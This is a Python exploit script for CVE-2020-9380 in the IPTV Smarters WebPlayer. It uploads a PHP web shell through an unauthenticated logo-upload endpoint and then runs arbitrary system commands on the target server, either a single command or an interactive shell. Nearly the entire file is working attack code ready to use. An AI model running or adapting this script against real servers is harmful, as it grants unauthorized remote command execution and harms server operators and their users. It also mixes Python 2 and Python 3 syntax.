#!/usr/bin/env python3
#
# Exploit for IPTV Smarters WebPlayer ( http://www.whmcssmarters.com/ )

import argparse
import requests
import sys


def pr_ok(msg):
    print('[+] {}'.format(msg))

def pr_err(msg, exit=True, rc=1):
    print('[-] {}'.format(msg))
    if exit:
        sys.exit(rc)

def pr_info(msg):
    print('[*] {}'.format(msg))

def _banner():
    ban = """+---------------------------------------------------+
|               _           _                   _   |
|    __ _  __ _| | __ _  __| | ___  __  ___ __ | |  |
|   / _` |/ _` | |/ _` |/ _` |/ _ \ \ \/ / '_ \| |  |
|  | (_| | (_| | | (_| | (_| | (_) | >  <| |_) | |  |
|   \__, |\__,_|_|\__,_|\__,_|\___(_)_/\_\ .__/|_|  |
|   |___/                                |_|        |
| ------------------------------------------------- |
|              IPTV Smarters Web Player             |
|        Arbitrary File Upload (CVE-2020-9380)      |
|  @migueltarga @andersonpablo @8vw @douglasduffor  |
+---------------------------------------------------+"""
    return ban


def run(session, url, command):
    try:
        r = session.get(url+'/images/galado.php?cmd='+command)
    except Exception as e:
        pr_err(e)
    print r.text


def main():
    banner      =   _banner()
    parser = argparse.ArgumentParser()
    sys.stdout.write('{}\n\n'.format(banner))
    parser.add_argument('--url', '-u', required=True, type=str)
    parser.add_argument('--interactive', '-i', default=False, action='store_true')
    parser.add_argument('--command', '-c', type=str)
    args = parser.parse_args()

    if (args.command and args.interactive) or (not (args.interactive or args.command)):
        pr_err('Either --command or --interactive required.')

    exploit_url = args.url + '/includes/ajax-control.php'
    files = {'logoImage': ('galado.php', '<?php system($_GET["cmd"]); ?>')}

    session = requests.Session()

    try:
        pr_info('Checking if IPTV Smarters is installed')
        r = session.get(exploit_url)
    except Exception as e:
        pr_err(e)

    if r.status_code != 200:
        pr_err('Web Player not found in this URL...')

    try:
        content = requests.post(exploit_url, files=files)
    except Exception as e:
        pr_err(e)

    if content.text != 'images/galado.php':
        pr_err('Web Player not vulnerable!')

    if args.command:
        run(session, args.url, args.command)
        run(session, args.url, 'rm galado.php')
    elif args.interactive:
        pr_ok('Entering interactive shell; type "quit" or ^D to quit')

        while True:
            try:
                cmd = raw_input('> ')
            except EOFError:
                sys.exit(0)

            if cmd in ['quit', 'q', 'exit']:
                run(session, args.url, 'rm galado.php')
                sys.exit(0)

            run(session, args.url, cmd)


if __name__ == '__main__':
    main()
